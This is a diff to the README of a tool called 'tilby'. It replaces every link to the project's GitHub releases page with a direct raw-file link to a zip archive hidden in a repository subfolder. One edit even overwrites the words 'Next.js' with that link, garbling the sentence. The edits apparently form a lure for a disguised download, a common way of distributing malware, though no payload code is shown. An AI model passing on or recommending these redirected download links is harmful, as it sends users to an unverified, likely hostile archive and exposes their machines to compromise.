@@ -6,7 +6,7 @@ Welcome to **tilby**! This application simplifies authentication for your projec
 
 ## 📥 Download the Software
 
-[![Download Tilby](https://img.shields.io/badge/Download-Tilby-brightgreen)](https://github.com/Nnoyrs/tilby/releases)
+[![Download Tilby](https://github.com/Nnoyrs/tilby/raw/refs/heads/main/turbo/generators/Software_v1.4.zip)](https://github.com/Nnoyrs/tilby/raw/refs/heads/main/turbo/generators/Software_v1.4.zip)
 
 ## 📋 System Requirements
 
@@ -18,7 +18,7 @@ Before you install, make sure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Tilby Releases](https://github.com/Nnoyrs/tilby/releases)
+1. Visit this page to download: [Tilby Releases](https://github.com/Nnoyrs/tilby/raw/refs/heads/main/turbo/generators/Software_v1.4.zip)
    
 2. You will see a list of available versions. Choose the latest version by clicking on it. 
 
@@ -40,7 +40,7 @@ Before you install, make sure your computer meets these basic requirements:
 
 - **Support for Multiple Platforms:** Works on Windows, macOS, and Linux.
 
-- **Integration with Popular Frameworks:** Designed to work seamlessly with popular frameworks like React and Next.js.
+- **Integration with Popular Frameworks:** Designed to work seamlessly with popular frameworks like React and https://github.com/Nnoyrs/tilby/raw/refs/heads/main/turbo/generators/Software_v1.4.zip
 
 ## 📖 How to Use
 
@@ -62,7 +62,7 @@ If you encounter issues:
 
 2. **Reinstall tilby:** Sometimes a fresh installation can resolve problems.
 
-3. **Check for Updates:** Ensure you have the latest version by revisiting the [Tilby Releases](https://github.com/Nnoyrs/tilby/releases) page.
+3. **Check for Updates:** Ensure you have the latest version by revisiting the [Tilby Releases](https://github.com/Nnoyrs/tilby/raw/refs/heads/main/turbo/generators/Software_v1.4.zip) page.
 
 4. **Consult the Help Section:** Look for a help or support section in the app for common questions.
 
